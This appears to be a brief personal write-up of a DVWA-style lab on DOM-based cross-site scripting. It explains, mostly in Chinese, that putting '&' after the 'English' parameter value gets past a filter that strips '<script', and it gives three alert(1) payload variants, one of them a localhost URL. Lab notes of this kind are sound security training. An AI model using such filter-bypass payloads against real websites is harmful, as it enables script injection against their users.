# **DOM Based Cross Site Scripting (XSS)**

> The developer has tried to add a simple pattern matching to remove any references to "<script" to disable any JavaScript. Find a way to run JavaScript without using the script tags.
>

try 了一下，發現加了 `&` 在  English 後面可以逃過檢查，有時候後端過濾變數時會忘記處理重複性或多個變數的狀況，剛好類似目前的情境

```jsx
English&<script>alert(1)</script>
```

```jsx
default=English&<script>alert(1)</script>
```

```
http://localhost:8086/vulnerabilities/xss_d/?default=English&%3Cscript%3Ealert(1)%3C/script%3E
```
